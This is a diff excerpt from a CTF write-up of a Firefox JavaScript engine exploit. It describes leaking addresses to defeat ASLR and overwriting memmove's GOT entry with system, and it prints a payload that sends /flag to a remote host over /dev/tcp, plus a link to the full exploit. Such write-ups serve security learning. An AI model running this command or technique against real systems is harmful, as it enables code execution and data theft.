@@ -50,3 +50,5 @@ We can now modify this value to any address we want (right shifted) using the fi
 The next part of the exploit was taken straight from <https://github.com/phoenhex/files/blob/master/exploits/share-with-care/exploit.js> with just changing a few offsets. The basic idea was to leak a native function `Date.now` and calculate the base address of libxul.so, then leak a GOT entry and calculate the base address of libc and then have `system`. We then overwrite the `memmove` got with system and trigger a copy with our payload to copy the flag `bash -ic 'cat /flag > /dev/tcp/my.host/12345' &`
 
 `flag{fire_just_makes_the_blaze_better}`
+
+[Full exploit code here.](https://github.com/vakzz/ctfs/blob/master/Blaze2018/blazefox/exploit.html
